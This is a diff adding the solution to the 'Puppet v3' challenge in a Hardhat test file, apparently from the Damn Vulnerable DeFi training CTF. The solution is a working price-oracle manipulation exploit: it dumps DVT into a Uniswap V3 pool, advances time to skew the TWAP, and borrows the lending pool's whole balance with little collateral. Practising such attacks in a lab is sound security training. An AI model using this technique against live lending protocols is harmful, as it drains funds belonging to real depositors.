@@ -140,6 +140,74 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const log = console.log;
+
+        // Connect to contracts as attacker
+        const attackPool = await uniswapPool.connect(player);
+        const attackLendingPool = await lendingPool.connect(player);
+        const attackToken = await token.connect(player);
+        const attackWeth = await weth.connect(player);
+
+        // Helper function to log balances of addresses
+        const logBalances = async (name, address) => {
+            const dvt_bal = await attackToken.balanceOf(address);
+            const weth_bal = await weth.balanceOf(address);
+            const eth_bal = await ethers.provider.getBalance(address);
+            log(`Logging balance of ${name}`);
+            log('DVT:', ethers.utils.formatEther(dvt_bal))
+            log('WETH:', ethers.utils.formatEther(weth_bal))
+            log('ETH:', ethers.utils.formatEther(eth_bal))
+            log('')
+        };
+
+        await logBalances("Player", player.address)
+
+        // Helper function to get quotes from the Lending pool
+        const getQuote = async(amount, print=true) => {
+            const quote = await attackLendingPool.calculateDepositOfWETHRequired(amount);
+            if (print) log(`Quote of ${ethers.utils.formatEther(amount)} DVT is ${ethers.utils.formatEther(quote)} WETH`)
+            return quote
+        }
+
+        const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+        log(`Connecting to uniswap router at mainnet address ${uniswapRouterAddress}`)
+        const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);
+
+        log("Approving all player tokens to be taken from the uniswap router");
+        await attackToken.approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        log("Swapping all player tokens for as much WETH as possible.");
+        await uniswapRouter.exactInputSingle(
+            [attackToken.address,
+            weth.address,   
+            3000,
+            player.address,
+            PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
+            0,
+            0],
+            {
+                gasLimit: 1e7
+            }
+        );
+
+        await logBalances("Player", player.address)
+        await logBalances("Uniswap Pool", attackPool.address)
+
+        // Increase block time by 100 seconds
+        log("Increasing block time by 100 seconds")
+        await time.increase(100);
+
+        // Get new quote for borrow and approve lending pool for that amount
+        log("Getting new quote and approving lending pool for transfer");
+        const quote = await getQuote(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        await attackWeth.approve(attackLendingPool.address, quote);
+
+        // Borrow the funds
+        log("Borrowing funds");
+        await attackLendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        await logBalances("Player", player.address);
+        await logBalances("Lending Pool", attackLendingPool.address);
     });
 
     after(async function () {
